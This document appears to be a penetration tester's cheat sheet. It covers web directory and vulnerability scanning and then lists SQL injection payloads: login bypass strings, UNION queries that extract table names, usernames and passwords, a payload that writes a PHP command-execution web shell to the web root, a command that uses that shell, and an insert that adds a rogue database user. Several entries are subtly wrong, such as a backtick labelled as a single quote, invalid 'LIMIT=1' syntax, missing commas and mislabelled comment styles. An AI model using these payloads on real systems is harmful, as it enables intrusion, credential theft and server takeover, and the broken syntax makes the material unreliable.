## Enumerate
```bash
dirb $TARGET -r -z10 # recursive; wait 10 milliseconds between delays
```
```bash
python3 dirsearch/dirsearch.py -u $TARGET --o $TARGET-webcrawl.txt
```
```bash
nikto -h $TARGET -Format txt -o $TARGET-vulnscan-web.txt
```

Finding SQL Injection Vulnerabilities
```bash
` # single-quote
# the resulting error may indicate the underlying web server software, database software, and server OS 
```

## Exploit
SQL Comments
```
# MySQL, MariaDB
-- Oracle
/* Oracle
*/ Oracle
```

SQL Injection Attacks
```
# bypass auth (put SQLi in the username field; username might be required so supply that at least)
victor' or 1=1; -- 

# bypass auth (put SQLi in the username field; the LIMIT keyword might be necessary for some databases)
victor' or 1=1 LIMIT=1; -- 

' ORDER BY 1 # sort results based on the values of the first column

' UNION ALL SELECT 1,2,3 # return all rows 
' UNION ALL SELECT 1,2 @@version # return the database version
' UNION ALL SELECT 1,2 user() # return the acct running the database

# return all table names
' UNION ALL SELECT 1,2 table_name FROM information_schema.tables 

# return all column names
' UNION ALL SELECT 1,2 column_name FROM information_schema.columns WHERE table_name = 'usertbl' 

# return records from users table; put users in column 2, password in column 3 of output
' UNION ALL SELECT 1, username, password FROM usertbl 

# invoke PHP and echo PHP code into a file
' UNION ALL SELECT 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '/var/www/html/webshell.php'
firefox http://victim.edu/webshell.php?cmd=whoami # navigate to and use the above LFI
```

## Explore
SQL Database Queries
```sql
SELECT * FROM targetdb.usertbl; # database.table
USE targetdb;
SELECT * FROM usertbl;
```

## Effect
Add a new user to a SQL database
```sql
INSERT INTO targetdb.usertbl(username, password) VALUES ('victor','please');
```
